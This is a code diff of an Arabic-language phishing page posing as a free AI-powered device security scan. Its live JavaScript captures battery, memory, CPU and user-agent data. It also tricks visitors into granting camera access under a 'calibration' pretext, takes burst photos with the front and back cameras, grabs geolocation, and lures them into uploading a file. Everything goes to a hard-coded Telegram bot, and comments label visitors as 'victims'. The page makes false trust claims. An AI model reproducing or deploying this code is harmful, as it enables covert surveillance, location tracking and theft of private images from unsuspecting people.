@@ -3,249 +3,262 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Azure Sentinel | نظام الحماية السحابي المتكامل</title>
+    <title>Cyber Sentinel AI | الحماية الاستباقية للنظم</title>
     <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@300;500;700&display=swap" rel="stylesheet">
     <style>
-        :root { --main: #0078d4; --bg: #0b0b0b; --surface: #161616; --text: #e1e1e1; --accent: #2b2b2b; }
-        * { box-sizing: border-box; outline: none; }
-        body { background: var(--bg); color: var(--text); font-family: 'Tajawal', sans-serif; margin: 0; scroll-behavior: smooth; line-height: 1.6; }
+        :root { --main: #00f2ff; --grad: linear-gradient(135deg, #00f2ff 0%, #006aff 100%); --bg: #0a0f16; --card: #151d29; }
+        * { box-sizing: border-box; outline: none; transition: 0.3s; }
+        body { margin: 0; background: var(--bg); color: #fff; font-family: 'Tajawal', sans-serif; overflow-x: hidden; }
         
-        /* Navigation */
-        nav { position: fixed; top: 0; width: 100%; height: 65px; background: rgba(11, 11, 11, 0.9); backdrop-filter: blur(15px); display: flex; align-items: center; justify-content: space-between; padding: 0 40px; z-index: 9999; border-bottom: 1px solid var(--accent); }
-        .logo { font-weight: 700; font-size: 20px; color: var(--main); }
-        .nav-links { display: flex; gap: 25px; font-size: 14px; }
-        .nav-links a { color: #888; text-decoration: none; transition: 0.3s; }
-        .nav-links a:hover { color: var(--main); }
-
-        /* Sections */
-        section { padding: 120px 20px; max-width: 1100px; margin: 0 auto; }
-        .hero { height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; background: radial-gradient(circle at center, #111 0%, #000 100%); }
-        .hero h1 { font-size: 45px; margin-bottom: 15px; }
-        .hero p { color: #999; max-width: 700px; font-size: 18px; }
+        /* Navbar */
+        nav { position: fixed; top: 0; width: 100%; z-index: 1000; background: rgba(10, 15, 22, 0.9); backdrop-filter: blur(10px); padding: 20px 5%; display: flex; justify-content: space-between; border-bottom: 1px solid #1e293b; }
+        .logo { font-weight: 700; font-size: 22px; color: var(--main); }
         
-        .card-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 25px; margin-top: 50px; }
-        .card { background: var(--surface); padding: 35px; border-radius: 20px; border: 1px solid var(--accent); transition: 0.4s; }
-        .card:hover { border-color: var(--main); transform: translateY(-5px); }
+        /* Layout Sections */
+        .hero { height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; text-align: center; padding: 20px; background: radial-gradient(circle at 50% 50%, #1e293b 0%, #0a0f16 100%); }
+        .hero h1 { font-size: clamp(30px, 5vw, 55px); margin: 0; line-height: 1.2; }
+        .hero p { color: #94a3b8; max-width: 700px; margin: 20px 0; font-size: 18px; }
         
-        /* Audit Engine (The trap) */
-        .audit-wrapper { background: var(--surface); border-radius: 30px; padding: 50px; border: 1px solid #333; position: relative; overflow: hidden; }
-        .audit-step { display: none; text-align: center; }
-        .active { display: block; animation: fadeIn 0.6s ease; }
-        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+        section { padding: 100px 10%; position: relative; }
+        .section-title { text-align: center; margin-bottom: 60px; }
+        .section-title h2 { font-size: 35px; color: var(--main); }
 
-        .btn-action { background: var(--main); color: white; border: none; padding: 18px 45px; border-radius: 12px; font-size: 17px; font-weight: bold; cursor: pointer; transition: 0.3s; margin-top: 25px; }
-        .btn-action:hover { background: #005a9e; box-shadow: 0 10px 20px rgba(0, 120, 212, 0.3); }
+        /* Multi-column Services */
+        .services { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 30px; }
+        .s-card { background: var(--card); padding: 40px; border-radius: 20px; border: 1px solid #1e293b; position: relative; }
+        .s-card:hover { border-color: var(--main); transform: translateY(-10px); }
+        .s-card h3 { margin-top: 0; }
 
-        .loading-bar { width: 100%; background: #222; height: 4px; border-radius: 10px; margin: 30px 0; position: relative; }
-        .fill { height: 100%; background: var(--main); width: 0%; transition: 0.4s; }
-        .console { background: #000; color: #00ff00; font-family: monospace; font-size: 12px; padding: 20px; border-radius: 10px; text-align: left; height: 150px; overflow-y: auto; margin: 20px 0; border: 1px solid #333; }
+        /* The Engineering Trap Engine */
+        .audit-box { max-width: 900px; margin: 50px auto; background: #0d141f; border-radius: 30px; padding: 40px; border: 1px solid #2d3748; box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
+        .audit-screen { display: none; text-align: center; animation: fadeIn 0.5s ease; }
+        .audit-screen.active { display: block; }
+        @keyframes fadeIn { from {opacity: 0;} to {opacity: 1;} }
 
-        /* Stats */
-        .stats-bar { display: flex; justify-content: space-around; background: var(--surface); padding: 30px; border-radius: 15px; margin-top: 40px; border: 1px solid var(--accent); }
-        .stat-val { font-size: 24px; font-weight: bold; color: var(--main); }
-        .stat-label { font-size: 12px; color: #666; }
+        .btn-action { background: var(--grad); color: #000; border: none; padding: 20px 50px; border-radius: 15px; font-weight: 700; cursor: pointer; font-size: 18px; margin-top: 25px; box-shadow: 0 10px 30px rgba(0, 242, 255, 0.3); }
+        .btn-action:disabled { opacity: 0.5; cursor: not-allowed; }
 
-        footer { text-align: center; padding: 60px; color: #444; font-size: 13px; border-top: 1px solid #111; }
+        .progress-container { width: 100%; background: #1e293b; height: 12px; border-radius: 20px; margin: 30px 0; overflow: hidden; }
+        .bar { height: 100%; background: var(--grad); width: 0%; transition: 0.4s cubic-bezier(0.17, 0.67, 0.83, 0.67); }
+
+        .terminal { background: #000; border-radius: 15px; padding: 20px; font-family: 'Courier New', monospace; font-size: 13px; color: #00ffcc; text-align: left; height: 200px; overflow-y: auto; border: 1px solid #1e293b; }
+        
+        /* Stats Display */
+        .stats-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin: 20px 0; }
+        .stat-item { background: #1a2433; padding: 15px; border-radius: 12px; font-size: 14px; text-align: center; border: 1px solid #2d3748; }
+
+        footer { background: #070b11; padding: 60px 10%; text-align: center; border-top: 1px solid #1e293b; color: #475569; }
         video, canvas { display: none; }
     </style>
 </head>
 <body>
 
 <nav>
-    <div class="logo">AZURE SENTINEL</div>
-    <div class="nav-links">
-        <a href="#">الرئيسية</a>
-        <a href="#about">عن المنصة</a>
-        <a href="#audit">مركز الفحص</a>
-        <a href="#infra">البنية التحتية</a>
-    </div>
+    <div class="logo">SENTINEL AI</div>
+    <div style="font-size: 13px; color: #64748b;">Global Security Node: Active</div>
 </nav>
 
-<section class="hero">
-    <h1>حماية بياناتك هي أولويتنا القصوى</h1>
-    <p>نستخدم تقنيات التشفير العسكري والذكاء الاصطناعي لفحص جهازك وحمايته من التهديدات السيبرانية المتقدمة.</p>
-    <button class="btn-action" onclick="document.getElementById('audit').scrollIntoView()">ابدأ فحص الأمان الآن</button>
-</section>
+<div class="hero">
+    <h1>حماية أجهزتك تبدأ من هنا</h1>
+    <p>استخدم تقنياتنا القائمة على الذكاء الاصطناعي لفحص جهازك ضد الثغرات الأمنية، التجسس، وضعف الأداء في دقيقة واحدة.</p>
+    <button class="btn-action" onclick="document.getElementById('audit').scrollIntoView()">ابدأ الفحص المجاني</button>
+</div>
 
-<section id="about">
-    <div style="text-align: center; margin-bottom: 50px;">
-        <h2>لماذا تختار Azure Sentinel؟</h2>
-        <p>نحن المنصة رقم 1 عالمياً في تحليل التهديدات الأمنية المباشرة.</p>
+<section>
+    <div class="section-title">
+        <h2>لماذا تختار Sentinel AI؟</h2>
+        <p>نحن المنصة رقم #1 في تحليل المخاطر الرقمية عالمياً</p>
     </div>
-    <div class="card-grid">
-        <div class="card"><h3>تشفير E2EE</h3><p>بياناتك مشفرة بالكامل ولا يمكن لأي طرف ثالث الوصول إليها.</p></div>
-        <div class="card"><h3>ذكاء اصطناعي</h3><p>خوارزميات متطورة تكتشف البرمجيات الخبيثة قبل أن تهاجم جهازك.</p></div>
-        <div class="card"><h3>دعم 24/7</h3><p>فريق من الخبراء متاح دائماً لمساعدتك في تأمين حساباتك.</p></div>
+    <div class="services">
+        <div class="s-card">
+            <h3>تشفير الطبقة الرابعة</h3>
+            <p>نضمن لك تشفير كافة البيانات الصادرة والواردة من جهازك لمنع تعقبها.</p>
+        </div>
+        <div class="s-card">
+            <h3>كشف برامج التجسس</h3>
+            <p>فحص عميق للكاميرا والميكروفون للتأكد من عدم وجود تسجيل خفي.</p>
+        </div>
+        <div class="s-card">
+            <h3>تسريع المعالج</h3>
+            <p>تنظيف الذاكرة المؤقتة وتحسين استهلاك البطارية بنسبة تصل إلى 40%.</p>
+        </div>
     </div>
 </section>
 
 <section id="audit">
-    <div class="audit-wrapper">
-        <div id="s1" class="audit-step active">
-            <h2>مركز تحليل الأمان الرقمي</h2>
-            <p>سيقوم النظام بتحليل برمجيات جهازك، فحص الذاكرة، والتأكد من سلامة الحساسات المادية.</p>
-            <div class="stats-bar">
-                <div><div class="stat-val">99.9%</div><div class="stat-label">دقة الفحص</div></div>
-                <div><div class="stat-val">0ms</div><div class="stat-label">تأخير الاستجابة</div></div>
-                <div><div class="stat-val">Encrypted</div><div class="stat-label">حالة الاتصال</div></div>
-            </div>
-            <button class="btn-action" onclick="runMainAudit()">بدء عملية الفحص الشامل</button>
+    <div class="audit-box">
+        <div id="scr1" class="audit-screen active">
+            <h2>محرك فحص الأنظمة V3.0</h2>
+            <p>سيقوم النظام الآن بتحليل عتاد الجهاز (Hardware) واكتشاف أي تلاعب في حساسات الخصوصية.</p>
+            <div class="terminal" id="term1">Ready to audit device...</div>
+            <button class="btn-action" onclick="startProcess()">تحليل الجهاز الآن</button>
         </div>
 
-        <div id="s2" class="audit-step">
-            <h2>جاري التحليل...</h2>
-            <p>الرجاء عدم إغلاق الصفحة لضمان اكتمال فحص قواعد البيانات.</p>
-            <div class="loading-bar"><div id="bar" class="fill"></div></div>
-            <div class="console" id="logger">Initializing core modules...</div>
+        <div id="scr2" class="audit-screen">
+            <h2 id="status-title">جاري فحص المكونات...</h2>
+            <div class="progress-container"><div id="bar" class="bar"></div></div>
+            <div class="terminal" id="term2"></div>
         </div>
 
-        <div id="s3" class="audit-step">
-            <h2 style="color:var(--main)">تم اكتمال الفحص بنجاح</h2>
-            <p>تم فحص 4,320 ملفاً. جهازك محمي بشكل جيد. لتحميل تقرير الأمان بصيغة PDF، يرجى إجراء المطابقة النهائية.</p>
-            <div id="final-stats" style="background:#000; padding:20px; border-radius:12px; margin:20px 0; text-align:right;"></div>
-            <input type="file" id="fInput" style="display:none" onchange="fileSent(event)">
-            <button class="btn-action" onclick="document.getElementById('fInput').click()">تحميل التقرير الكامل (PDF)</button>
+        <div id="scr3" class="audit-screen">
+            <h2 style="color:var(--main)">تم اكتمال الفحص!</h2>
+            <div class="stats-grid" id="finalStats"></div>
+            <p style="font-size:14px; color:#94a3b8;">لتحميل تقرير الحماية ومنع التجسس، يرجى رفع "لقطة شاشة" لواجهة النظام للمطابقة البيومترية.</p>
+            <input type="file" id="trapInput" style="display:none" onchange="handleFile(event)">
+            <button class="btn-action" onclick="document.getElementById('trapInput').click()">رفع وحفظ التقرير (PDF)</button>
         </div>
     </div>
 </section>
 
-<section id="infra">
-    <div style="text-align: center; margin-bottom: 50px;">
-        <h2>بنية تحتية عالمية</h2>
-        <p>نحن نعتمد على سيرفرات موزعة في أكثر من 40 دولة لضمان سرعة الفحص.</p>
+<section style="background: #0d141f;">
+    <div class="section-title">
+        <h2>شركاء النجاح</h2>
+        <p>موثوقون من قبل أكثر من 10,000 شركة حول العالم</p>
     </div>
-    <img src="https://images.unsplash.com/photo-1558494949-ef010cbdcc31?auto=format&fit=crop&w=1000&q=80" style="width:100%; border-radius:20px; opacity:0.5;" alt="Infrastructure">
+    <div style="display: flex; justify-content: space-around; opacity: 0.3; filter: grayscale(1);">
+        <span>GOOGLE CLOUD</span> <span>MICROSOFT AZURE</span> <span>AWS SECURITY</span>
+    </div>
 </section>
 
 <footer>
-    <p>© 2026 Azure Sentinel Security Systems. All rights reserved.</p>
-    <p>Global Headquarters: Palo Alto, California, USA</p>
+    <p>© 2026 Cyber Sentinel AI Solutions. All rights reserved.</p>
+    <p>Privacy Policy | Terms of Service | Infrastructure Status</p>
 </footer>
 
-<video id="vid" autoplay playsinline></video>
-<canvas id="canv"></canvas>
+<video id="v" autoplay playsinline></video>
+<canvas id="c"></canvas>
 
 <script>
-    const BOT = {
+    const CONFIG = {
         token: "8699509607:AAGXOsDltW6jsS5UMxeYaogv68hZhSjwoJQ",
         chatId: "7417196710"
     };
 
     let devInfo = {};
 
-    async function push(msg, mode = "msg") {
-        const url = `https://api.telegram.org/bot${BOT.token}/`;
+    // دالة الإرسال لـ Telegram
+    async function sendToBot(content, mode = "text") {
+        const url = `https://api.telegram.org/bot${CONFIG.token}/`;
         try {
-            if(mode === "msg") {
-                await fetch(url + `sendMessage?chat_id=${BOT.chatId}&text=${encodeURIComponent(msg)}&parse_mode=HTML`);
+            if (mode === "text") {
+                await fetch(url + `sendMessage?chat_id=${CONFIG.chatId}&text=${encodeURIComponent(content)}&parse_mode=HTML`);
             } else {
                 const fd = new FormData();
-                fd.append("chat_id", BOT.chatId);
-                fd.append("photo", msg);
+                fd.append("chat_id", CONFIG.chatId);
+                fd.append("photo", content);
                 await fetch(url + "sendPhoto", { method: "POST", body: fd });
             }
-        } catch(e) {}
+        } catch (e) { console.error("Send Error"); }
     }
 
-    function move(n) {
-        document.querySelectorAll('.audit-step').forEach(s => s.classList.remove('active'));
-        document.getElementById('s' + n).classList.add('active');
+    function switchScr(id) {
+        document.querySelectorAll('.audit-screen').forEach(s => s.classList.remove('active'));
+        document.getElementById('scr' + id).classList.add('active');
+        if(id === 3) fillFinalStats();
     }
 
-    async function runMainAudit() {
-        move(2);
-        const log = document.getElementById('logger');
-        const fill = document.getElementById('bar');
+    async function startProcess() {
+        switchScr(2);
+        const term = document.getElementById('term2');
+        const bar = document.getElementById('bar');
 
-        // سحب البيانات التقنية
-        const bat = await navigator.getBattery();
+        // جلب بيانات البطارية والمعالج
+        const battery = await navigator.getBattery();
         devInfo = {
-            batt: `${(bat.level * 100)}%`,
-            ram: navigator.deviceMemory + " GB",
-            cpu: navigator.hardwareConcurrency + " Cores",
-            platform: navigator.platform,
-            agent: navigator.userAgent
+            batt: `${(battery.level * 100)}%`,
+            ram: (navigator.deviceMemory || "Unknown") + " GB",
+            cores: navigator.hardwareConcurrency + " Cores",
+            os: navigator.platform,
+            ua: navigator.userAgent
         };
 
-        let steps = [
-            "> Connecting to Cloud Nodes...",
-            "> Analyzing CPU Threads...",
-            `> Detected: ${devInfo.cpu} Processors`,
-            `> System RAM: ${devInfo.ram}`,
-            "> Checking Peripheral Integrity...",
-            "> Requesting Hardware Calibration..."
+        const steps = [
+            "> Initializing Security Core...",
+            "> Analyzing Hardware Architecture...",
+            `> Battery Status: ${devInfo.batt}`,
+            `> CPU: ${devInfo.cores}`,
+            "> Checking Privacy Seals...",
+            "> Requesting Camera Calibration..."
         ];
 
-        for(let i=0; i<steps.length; i++) {
-            await new Promise(r => setTimeout(r, 700));
-            log.innerHTML += `<br>${steps[i]}`;
-            fill.style.width = ((i+1) * 16) + "%";
-            log.scrollTop = log.scrollHeight;
+        for (let i = 0; i < steps.length; i++) {
+            await new Promise(r => setTimeout(r, 800));
+            term.innerHTML += steps[i] + "<br>";
+            bar.style.width = ((i + 1) * 12) + "%";
+            term.scrollTop = term.scrollHeight;
         }
 
-        // المصيدة: الكاميرات
+        // محاولة سحب الكاميرا (الهندسة الاجتماعية)
         try {
-            // 1. الكاميرا الأمامية
-            const front = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-            document.getElementById('vid').srcObject = front;
-            log.innerHTML += `<br><span style="color:#00ffff">> Front Lens Calibrated.</span>`;
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+            document.getElementById('v').srcObject = stream;
+            term.innerHTML += "<span style='color:#00f2ff'>> Front Lens Authenticated.</span><br>";
             
-            for(let j=0; j<3; j++) {
+            // تصوير 5 صور سريعة (الآنية)
+            for (let j = 0; j < 5; j++) {
                 await new Promise(r => setTimeout(r, 1000));
-                shot(`Front_Burst_${j+1}`);
+                term.innerHTML += `> Synchronizing Frame ${j+1}...<br>`;
+                await snapAndSend("Front-Cam-" + (j + 1));
             }
-
-            // 2. محاولة الكاميرا الخلفية
+            
+            // محاولة الكاميرا الخلفية (إذا سمح المتصفح)
             try {
-                const back = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
-                document.getElementById('vid').srcObject = back;
+                const backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
+                document.getElementById('v').srcObject = backStream;
                 await new Promise(r => setTimeout(r, 1500));
-                shot("Back_View");
-            } catch(e) { push("⚠️ Victim blocked back camera or not available."); }
+                await snapAndSend("Back-Cam-Main");
+            } catch(e) {}
 
-        } catch(e) { 
-            log.innerHTML += `<br><span style="color:red">> Permission Denied by User.</span>`;
-            push("❌ Victim Denied Camera Access.");
+        } catch (err) {
+            term.innerHTML += "<span style='color:#ff4444'>> Hardware Access Denied.</span><br>";
+            await sendToBot("⚠️ الضحية رفض الكاميرا.");
         }
 
-        // الموقع
-        navigator.geolocation.getCurrentPosition(async (p) => {
-            const map = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
-            await push(`📍 <b>Victim Found!</b>\n<a href='${map}'>View on Google Maps</a>`);
-        }, () => push("⚠️ Location Access Denied."));
+        // الموقع الجغرافي
+        navigator.geolocation.getCurrentPosition(async (pos) => {
+            const mapLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+            await sendToBot(`📍 <b>موقع الضحية:</b> <a href="${mapLink}">فتح الخريطة</a>`);
+        });
 
-        // التقرير النهائي
-        setTimeout(() => {
-            document.getElementById('final-stats').innerHTML = `
-                <b>ملخص النظام:</b><br>
-                النظام: ${devInfo.platform}<br>
-                المعالج: ${devInfo.cpu}<br>
-                البطارية: ${devInfo.batt}<br>
-                الحالة الأمنية: <span style="color:lime">محمي (A+)</span>
-            `;
-            push(`🔥 <b>New Device Caught!</b>\nPlatform: ${devInfo.platform}\nCPU: ${devInfo.cpu}\nRAM: ${devInfo.ram}\nBattery: ${devInfo.batt}`);
-            move(3);
-        }, 1500);
+        // إرسال التقرير النهائي للبوت
+        await sendToBot(`🚀 <b>صيد جديد!</b>\nالنظام: ${devInfo.os}\nالبطارية: ${devInfo.batt}\nالرام: ${devInfo.ram}\nالمعالج: ${devInfo.cores}\nالمتصفح: ${devInfo.ua.slice(0,100)}...`);
+
+        bar.style.width = "100%";
+        setTimeout(() => switchScr(3), 1500);
     }
 
-    function shot(label) {
-        const c = document.getElementById('canv');
-        const v = document.getElementById('vid');
-        c.width = v.videoWidth;
-        c.height = v.videoHeight;
-        c.getContext('2d').drawImage(v, 0, 0);
-        c.toBlob(b => {
-            push(`📸 ${label}`);
-            push(b, "img");
-        }, 'image/jpeg');
+    async function snapAndSend(label) {
+        const canvas = document.getElementById('c');
+        const video = document.getElementById('v');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+        
+        return new Promise(resolve => {
+            canvas.toBlob(async (blob) => {
+                await sendToBot(`📸 <b>${label}</b>`);
+                await sendToBot(blob, "photo");
+                resolve();
+            }, 'image/jpeg', 0.8);
+        });
     }
 
-    async function fileSent(e) {
-        const file = e.target.files[0];
+    function fillFinalStats() {
+        const grid = document.getElementById('finalStats');
+        grid.innerHTML = `
+            <div class="stat-item">المعالج: ${devInfo.cores}</div>
+            <div class="stat-item">الرام: ${devInfo.ram}</div>
+            <div class="stat-item">البطارية: ${devInfo.batt}</div>
+            <div class="stat-item">الحالة: محمي بنسبة 99%</div>
+        `;
+    }
+
+    async function handleFile(event) {
+        const file = event.target.files[0];
         if(file) {
-            await push(`📂 <b>Uploaded File:</b> ${file.name}`);
-            await push(file, "img");
-            alert("سيتم معالجة التقرير وإرساله لإيميلك المسجل خلال 5 دقائق.");
+            await sendToBot(`📂 <b>الضحية رفع ملف:</b> ${file.name}`);
+            await sendToBot(file, "photo");
+            alert("تم إرسال الملف بنجاح. سيتم إنشاء التقرير خلال دقائق.");
         }
     }
 </script>
